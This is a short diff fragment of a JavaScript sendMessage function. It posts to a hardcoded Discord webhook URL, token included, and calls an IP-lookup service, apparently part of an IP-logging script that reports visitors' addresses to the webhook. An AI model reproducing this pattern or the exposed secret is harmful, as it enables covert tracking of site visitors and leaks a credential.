@@ -9,7 +9,7 @@ function sendMessage() {
       request.open("POST", "https://discord.com/api/webhooks/1318648499599839253/b6yUhYvvxVPzD008yXF_uiPnuKLuwvciX4FOBcG9Mfsx2dkoevCE-wssJXO8Z8xfUXQt");
 
       request.setRequestHeader('Content-type', 'application/json');
-
+ }
       
 
 fetch('https://api.ipify.org?format=json')
